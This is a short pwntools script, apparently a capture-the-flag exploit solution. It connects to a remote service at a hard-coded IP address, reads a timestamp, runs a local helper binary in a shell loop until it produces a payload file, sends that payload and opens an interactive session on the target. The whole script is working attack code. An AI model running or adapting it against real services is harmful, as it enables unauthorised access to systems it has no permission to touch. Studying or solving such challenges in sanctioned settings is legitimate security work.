from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = '111.186.58.164', 30333

r = remote(HOST, PORT)
r.sendline('')
r.sendline('1')

r.recvuntil('Timestamp: ')
ts = int(r.recvline())

os.system('rm /tmp/payload; while [ ! -f /tmp/payload ] ; do ./main %d |tail -1; done' % ts)
x = open('/tmp/payload', 'rb').read()
assert b'\n' not in x
r.send(x + b'\x00')

r.interactive()